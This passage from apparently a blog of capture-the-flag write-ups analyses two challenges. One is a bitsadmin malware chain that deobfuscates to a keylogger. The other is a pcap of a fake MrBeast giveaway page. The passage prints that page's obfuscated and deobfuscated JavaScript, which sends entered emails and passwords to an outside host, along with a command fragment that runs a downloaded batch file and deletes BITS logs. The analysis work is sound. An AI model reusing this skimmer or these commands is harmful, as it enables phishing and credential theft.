%tmp%\\\\t.bat \u0026amp; %tmp%\\\\t.bat \u0026amp; sc stop bits \u0026amp; timeout 5 \u0026amp; del /Q /F C:\\\\ProgramData\\\\Microsoft\\\\Network\\\\Downloader\\\\* \u0026amp; sc start bits Bitsadmin command creates jobs and assigns them a task. Here, bitsadmin creates a job named RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU to download a .bat file from a domain, run it, then stop the bitsadmin process in order to delete its logs and then starts it again. We can agree on that the job\u0026rsquo;s name is really sus and if we decode it from b64 we get the first part of the flag:\nNice. All that\u0026rsquo;s left is the last .bat file in the remaining pcap. Opening it, we get another obfuscated .bat file different than the previous one:\nAgain, one can try and deobfuscate it manually, but why not follow up with the same methodology as previously? Loading the file in VT, we get another interesting name:\nIt is not as easy as with the previous one to indentify the right name, but after a bit of googling we can see that Jlaive is a tool used for obfuscation that gives a matching result as the one we have:\nSo basically, Jlaive is a tool used to convert .NET executables to obfuscated .bat files. Interesting. Well, for such a tool to exist, there must be the corresponding tool that does the reverse operation. Searching for a bit, we find a tool named Get-UnJlaive which can be found in the following repo:\nhttps://github.com/Dump-GUY/Get-UnJlaive This tool reconstructs the original executable before it was converted to this .bat. Setting up the tool and running it, we successfully get an executable back:\nIf we run the file command on the .exe, we see its a Mono/.NET assembly:\n└─$ file t.bat_orig.exe t.bat_orig.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Loading the executable to DnSpy, we are met with\u0026hellip;another seemingly obfuscated file:\nThis executable seems to have been packed with some .NET packer. This time, VT won\u0026rsquo;t be of any help to us. We can either identify the packer used by either using a simple strings command which will reveal the path where this executable was stored at build time, or we can search through the functions of the executable and find the packer in the class \u0026ldquo;cab44dfc2d326bea8c4438eb03ca73b4d\u0026rdquo;:\nusing System; using System.Reflection; namespace A { // Token: 0x02000007 RID: 7 internal class cab44dfc2d326bea8c4438eb03ca73b4d { // Token: 0x0600001A RID: 26 RVA: 0x00003868 File Offset: 0x00001A68 private static string ccea6e29829419d8153060be40cf7772a(Assembly cdefd3af7ac5b57777d7057f73f12ed1e) { string text = cdefd3af7ac5b57777d7057f73f12ed1e.FullName; int num = text.IndexOf(\u0026#39;,\u0026#39;); if (num \u0026gt;= 0) { text = text.Substring(0, num); } return text; } // Token: 0x0600001B RID: 27 RVA: 0x00003898 File Offset: 0x00001A98 internal static void c5b6799dda81c5313f25256842d094434() { string text = \u0026#34;638492234169640792\u0026#34;; DateTime dateTime = new DateTime(long.Parse(text)); if (DateTime.Now \u0026gt; dateTime) { for (;;) { switch (4) { case 0: continue; } break; } if (!true) { RuntimeMethodHandle runtimeMethodHandle = methodof(cab44dfc2d326bea8c4438eb03ca73b4d.c5b6799dda81c5313f25256842d094434()).MethodHandle; } string text2 = cab44dfc2d326bea8c4438eb03ca73b4d.ccea6e29829419d8153060be40cf7772a(Assembly.GetExecutingAssembly()); string text3 = string.Concat(new string[] { \u0026#34;The assembly \u0026#39;\u0026#34;, text2, \u0026#34;\u0026#39; is created with an evaluation version of CryptoObfuscator and will stop working on \u0026#34;, dateTime.ToString(\u0026#34;d-MMM-yyyy.\u0026#34;), \u0026#34; The evaluation period has expired and the application will now exit.\u0026#34; }); throw new Exception(text3); } } } } CryptoObfuscator! The only thing that is left to do is to find the corresponding tool to deobfuscate the executable for us. The one I will use can be found in the following repo:\nhttps://github.com/Rhotav/Crypto-Deobfuscator Building and running the tool, we get the deobfuscated file:\nSearching through the deobfuscated methods, we see the executable is basically a keylogger that sends the logged keystrikes through email. In method_4, we can find the part2 of our flag:\nFull flag: ECSC{477_7h353_ch41nd_73chn1ch35_f02_ju57_4_k3yl09932}\n","permalink":"http://localhost:1313/ctfwriteups/mranderson/","summary":"This is a writeup for the babufscation challenge This challenge gives us a zip file containing 3 pcap files:\nWhat we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.\nWe can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.","title":"Mr Anderson - Writeup"},{"content":"Starting the analysis A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.\nOpening the file with Wireshark, we can view all the requests.\nThe request that is of interest is the one made to themrbeas7.org and is the following:\nGET /christmasGiveaway/index.html HTTP/1.1 Host: themrbeas7.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 HTTP/1.0 200 OK Server: Apache/2.4.43 (FreeBSD) Date: Mon, 04 Dec 2023 10:09:52 GMT Content-type: text/html Content-Length: 10649 Last-Modified: Sun, 03 Dec 2023 17:25:38 GMT \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;img/Favicon.png\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Xmas Giveaway\u0026lt;/title\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/jquery.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/timer.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/bootstrap.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; \u0026lt;link href=\u0026#39;http://fonts.googleapis.com/css?family=Lobster\u0026#39; rel=\u0026#39;stylesheet\u0026#39; type=\u0026#39;text/css\u0026#39;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/custom.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body onload=\u0026#34;countdown(year,month,day,hour,minute)\u0026#34;\u0026gt; \u0026lt;!-- Carousel --\u0026gt; \u0026lt;div id=\u0026#34;myCarousel\u0026#34; class=\u0026#34;carousel slide\u0026#34; data-ride=\u0026#34;carousel\u0026#34;\u0026gt; \u0026lt;!-- Indicators --\u0026gt; \u0026lt;ol class=\u0026#34;carousel-indicators\u0026#34;\u0026gt; \u0026lt;li data-target=\u0026#34;#myCarousel\u0026#34; data-slide-to=\u0026#34;0\u0026#34; class=\u0026#34;active\u0026#34;\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li data-target=\u0026#34;#myCarousel\u0026#34; data-slide-to=\u0026#34;1\u0026#34; \u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li data-target=\u0026#34;#myCarousel\u0026#34; data-slide-to=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;div class=\u0026#34;carousel-inner\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;container timer\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;home\u0026#34; class= \u0026#34;logo text-center\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;font color=\u0026#34;red\u0026#34;\u0026gt;Christmas is almost here\u0026lt;/font\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row timer-circle\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;main-text text-center\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;sub-text\u0026#34;\u0026gt;Giveaway countdown\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;numbers\u0026#34; id=\u0026#34;count2\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;col-lg-12 col-md-12 col-sm-12 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dday\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;days\u0026#34;\u0026gt;Day\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dhour\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;hours\u0026#34;\u0026gt;Hr\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dmin\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;minutes\u0026#34;\u0026gt;Min\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dsec\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer2\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34; id= \u0026#34;seconds\u0026#34;\u0026gt;Sec\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of clock --\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of timer-circle --\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of timer --\u0026gt; \u0026lt;div class=\u0026#34;item active\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;img/mrBeast.jpg\u0026#34; alt=\u0026#34;First slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;carousel-caption caption\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;The biggest christmas giveaway is on its way...\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of first item --\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;img/santa.jpg\u0026#34; alt=\u0026#34;Second slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;carousel-caption caption\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;You may be one of the lucky ones that will meet Santa...\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of second item --\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;img/elfs.jpeg\u0026#34; alt=\u0026#34;Third slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;carousel-caption caption\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Subscribe! The Mr. Beast team is waiting to meet you!\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of third item --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of carousel --\u0026gt; \u0026lt;div class= \u0026#34;body-content\u0026#34;\u0026gt; \u0026lt;!-- subscribe --\u0026gt; \u0026lt;div class= \u0026#34;container subscribe\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;col-lg-6 col-lg-offset-3 subscribe-text\u0026#34;\u0026gt; \u0026lt;h3 class= \u0026#34;text-center\u0026#34;\u0026gt;Subscribe\u0026lt;/h3\u0026gt; \u0026lt;hr class= \u0026#34;full\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Welcome to the biggest ever giveaway by the Mr. Beast team!\u0026lt;/p\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of subscribe --\u0026gt; \u0026lt;div class= \u0026#34;container after-slide\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3 col-lg-8 col-lg-offset-2 col-sm-12 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;p class= \u0026#34;after-slide-text\u0026#34;\u0026gt;Secure your chance to win a fully paid trip to the North Pole by registering now! Don\u0026#39;t miss out on the opportunity to be among the exclusive group of participants eligible for this exciting giveaway. Register your account today for a chance at winning this exclusive trip and meeting Santa Claus in person!\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;subscribe-form\u0026#34; \u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;input-group-addon\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-envelope-o fa-fw\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Email address\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input-group col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12 text-center form\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;input-group-addon\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-key fa-fw\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;input class=\u0026#34;form-control\u0026#34; type=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input-group margin-bottom-sm col-md-6 col-md-offset-3 col-lg-6 col-lg-offset-3 col-sm-8 col-sm-offset-2 col-xs-12\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-info\u0026#34;\u0026gt;Subscribe\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of after slide part --\u0026gt; \u0026lt;!-- share part --\u0026gt; \u0026lt;div class=\u0026#34;container share\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;col-lg-6 col-lg-offset-3 share-text\u0026#34;\u0026gt; \u0026lt;h3 class= \u0026#34;text-center\u0026#34;\u0026gt;Our Socials\u0026lt;/h3\u0026gt; \u0026lt;hr class= \u0026#34;full\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Find us at our social media platforms to be updated about the results\u0026lt;/p\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;container share-icons text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;col-lg-12 col-md-12 col-sm-12 col-xs-12\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;socials-icons col-lg-12 col-md-12 col-sm-12 col-xs-12\u0026#34;\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;https://www.facebook.com/MrBeast6000\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;Share in Facebook\u0026#34; class=\u0026#34;facebook\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-facebook\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;https://twitter.com/mrbeast?lang=en\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;Share in Twitter\u0026#34; class=\u0026#34;twitter\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-twitter\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;https://www.instagram.com/mrbeast/?hl=en\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;Share in Instagram\u0026#34; class=\u0026#34;instagram\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-instagram\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of share part --\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!-- end of body content --\u0026gt; \u0026lt;!-- footer --\u0026gt; \u0026lt;div class=\u0026#34;wrapper footer\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row text-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;name col-lg-2 col-md-2 col-sm-2 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Giveaway\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-lg-8 col-md-8 col-sm-8 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;copyright\u0026#34;\u0026gt; \u0026amp;copy; Mr.Beast Team \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;col-lg-2 col-md-2 col-sm-2 col-xs-12\u0026#34; id=\u0026#34;back-top\u0026#34;\u0026gt; \u0026lt;p class= \u0026#34;pull-right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;#home\u0026#34;\u0026gt;\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;Top\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\t\u0026lt;/div\u0026gt;\t\u0026lt;/div\u0026gt;\u0026lt;!-- row --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;!--end of footer --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;script\u0026gt; function _0x299a(_0xa725a8,_0x48ecb7){var _0x33465e=_0x3346();return _0x299a=function(_0x299a8c,_0x4edf29){_0x299a8c=_0x299a8c-0x7f;var _0x3b4711=_0x33465e[_0x299a8c];return _0x3b4711;},_0x299a(_0xa725a8,_0x48ecb7);}var _0x52de18=_0x299a;function _0x3346(){var _0x1cd6fe=[\u0026#39;length\u0026#39;,\u0026#39;.subscribe-form\\x20.form-control[type=\\x22password\\x22]\u0026#39;,\u0026#39;click\u0026#39;,\u0026#39;10GjwUiH\u0026#39;,\u0026#39;283448ojrvqi\u0026#39;,\u0026#39;PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec\u0026#39;,\u0026#39;.subscribe-form\\x20.btn.btn-info\u0026#39;,\u0026#39;GET\u0026#39;,\u0026#39;11wIJUzs\u0026#39;,\u0026#39;385aGCgYF\u0026#39;,\u0026#39;203916QRBBAJ\u0026#39;,\u0026#39;addEventListener\u0026#39;,\u0026#39;186854HAAPmi\u0026#39;,\u0026#39;DOMContentLoaded\u0026#39;,\u0026#39;push\u0026#39;,\u0026#39;34662TcBphL\u0026#39;,\u0026#39;join\u0026#39;,\u0026#39;open\u0026#39;,\u0026#39;value\u0026#39;,\u0026#39;querySelector\u0026#39;,\u0026#39;charCodeAt\u0026#39;,\u0026#39;5003910eMoXPe\u0026#39;,\u0026#39;945368MfXSkw\u0026#39;,\u0026#39;9CofhOF\u0026#39;,\u0026#39;\u0026amp;apikey=\u0026#39;,\u0026#39;https://storage.appssec.co.ind?email=\u0026#39;,\u0026#39;send\u0026#39;,\u0026#39;724557XgnpSv\u0026#39;];_0x3346=function(){return _0x1cd6fe;};return _0x3346();}(function(_0x104a86,_0xa6db47){var _0x4c8d43=_0x299a,_0xf91101=_0x104a86();while(!![]){try{var _0x29d6b2=-parseInt(_0x4c8d43(0x8c))/0x1+parseInt(_0x4c8d43(0x94))/0x2+-parseInt(_0x4c8d43(0x87))/0x3+-parseInt(_0x4c8d43(0x92))/0x4*(parseInt(_0x4c8d43(0x8b))/0x5)+parseInt(_0x4c8d43(0x97))/0x6*(parseInt(_0x4c8d43(0x91))/0x7)+-parseInt(_0x4c8d43(0x82))/0x8*(parseInt(_0x4c8d43(0x83))/0x9)+parseInt(_0x4c8d43(0x81))/0xa*(parseInt(_0x4c8d43(0x90))/0xb);if(_0x29d6b2===_0xa6db47)break;else _0xf91101[\u0026#39;push\u0026#39;](_0xf91101[\u0026#39;shift\u0026#39;]());}catch(_0x4597d0){_0xf91101[\u0026#39;push\u0026#39;](_0xf91101[\u0026#39;shift\u0026#39;]());}}}(_0x3346,0x28a39),document[_0x52de18(0x93)](_0x52de18(0x95),function(){var _0x3010de=_0x52de18;const _0x4c17d1=document[\u0026#39;querySelector\u0026#39;](_0x3010de(0x8e)),_0x5bc16f=document[_0x3010de(0x7f)](\u0026#39;.subscribe-form\\x20.form-control[type=\\x22text\\x22]\u0026#39;),_0x106e8a=document[_0x3010de(0x7f)](_0x3010de(0x89));_0x4c17d1[_0x3010de(0x93)](_0x3010de(0x8a),function(){var _0xaf724a=_0x3010de;const _0x3a9d03=_0x5bc16f[_0xaf724a(0x9a)],_0x38e031=_0x106e8a[_0xaf724a(0x9a)];var _0x37a3bb=_0xaf724a(0x8d);function _0x2ae5a0(_0x49225f){var _0x4a91e4=_0xaf724a,_0x1d14ff=[\u0026#39;s\u0026#39;,\u0026#39;a\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;a\u0026#39;],_0x1bcfcc=[];input=atob(_0x49225f);for(var _0x4d4b2f=0x0;_0x4d4b2f\u0026lt;input[_0x4a91e4(0x88)];_0x4d4b2f++){var _0x41b22f=input[_0x4a91e4(0x80)](_0x4d4b2f)^_0x1d14ff[_0x4d4b2f%_0x1d14ff[_0x4a91e4(0x88)]][_0x4a91e4(0x80)](0x0);_0x1bcfcc[_0x4a91e4(0x96)](String[\u0026#39;fromCharCode\u0026#39;](_0x41b22f));}return _0x1bcfcc[_0x4a91e4(0x98)](\u0026#39;\u0026#39;);}function _0xe05049(){var _0x3ebbc9=_0xaf724a,_0x45261b=_0x3a9d03,_0x2bf34e=_0x38e031,_0x5ba78a=_0x2ae5a0(_0x37a3bb),_0x5b4edc=new XMLHttpRequest();_0x5b4edc[_0x3ebbc9(0x99)](_0x3ebbc9(0x8f),_0x3ebbc9(0x85)+_0x45261b+\u0026#39;\u0026amp;password=\u0026#39;+_0x2bf34e+_0x3ebbc9(0x84)+String(_0x5ba78a)),_0x5b4edc[_0x3ebbc9(0x86)]();}_0xe05049();});})); \u0026lt;/script\u0026gt; This request contains the index.html page of the themrbeas7.org website.\nWe can spot a suspicious looking script at the end of the html file contained in the request, but it does not make a lot of sense. We can distinguish some strings such as password, fromCharCode, h[x][x]ps://storage.appssec.co.ind? and so on.\nThis is basically obfuscated javascript. Let\u0026rsquo;s try to deobfuscate it and make sense of it.\nFor this purpose, we can use the online tool:\nhttps://deobfuscate.relative.im/ We can pass the obfuscated javascript to it and click on \u0026lsquo;deobfuscate\u0026rsquo;. Doing this, we get the following code:\ndocument.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function () { const _0x4c17d1 = document.querySelector(\u0026#39;.subscribe-form .btn.btn-info\u0026#39;), _0x5bc16f = document.querySelector( \u0026#39;.subscribe-form .form-control[type=\u0026#34;text\u0026#34;]\u0026#39; ), _0x106e8a = document.querySelector( \u0026#39;.subscribe-form .form-control[type=\u0026#34;password\u0026#34;]\u0026#39; ) _0x4c17d1.addEventListener(\u0026#39;click\u0026#39;, function () { const _0x3a9d03 = _0x5bc16f.value, _0x38e031 = _0x106e8a.value var _0x37a3bb = \u0026#39;PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec\u0026#39; function _0x2ae5a0(_0x49225f) { var _0x1d14ff = [\u0026#39;s\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;a\u0026#39;], _0x1bcfcc = [] input = atob(_0x49225f) for (var _0x4d4b2f = 0; _0x4d4b2f \u0026lt; input.length; _0x4d4b2f++) { var _0x41b22f = input.charCodeAt(_0x4d4b2f) ^ _0x1d14ff[_0x4d4b2f % _0x1d14ff.length].charCodeAt(0) _0x1bcfcc.push(String.fromCharCode(_0x41b22f)) } return _0x1bcfcc.join(\u0026#39;\u0026#39;) } function _0xe05049() { var _0x45261b = _0x3a9d03, _0x2bf34e = _0x38e031, _0x5ba78a = _0x2ae5a0(_0x37a3bb), _0x5b4edc = new XMLHttpRequest() _0x5b4edc.open( \u0026#39;GET\u0026#39;, \u0026#39;https://storage.appssec.co.ind?email=\u0026#39; + _0x45261b + \u0026#39;\u0026amp;password=\u0026#39; + _0x2bf34e + \u0026#39;\u0026amp;apikey=\u0026#39; + String(_0x5ba78a) ) _0x5b4edc.send() } _0xe05049() }) }) This script still looks obfuscated but we can agree that it looks much better than before. It basically adds a Listener on the subscribe form button. Listeners in javascript are basically actions that wait to be happened. Here, once the subscribe-form button has been clicked, the script we deobfuscated will run. But what does it actually do?\nWell, we see that it gets a username and a password from the form that had its button clicked. Then, it makes a request to the website h[x][x]ps://storage.appssec.co.ind with url arguments:\nusername password apikey The interesting part here is how the apikey is found. We notice a base64 encoded string that is decoded, xored with the key santa and then passed to the url where the request will be made.\nFollowing up with the actions of the script, if we decode the base64 string and xor it with the key, we will get the apikey which is also the flag for this challenge:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; apikey_encrypted = b\u0026#39;PSkvNyoILFxaI0BVW0M+RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec\u0026#39; \u0026gt;\u0026gt;\u0026gt; apikey_encr = b64decode(apikey_encrypted.decode()) 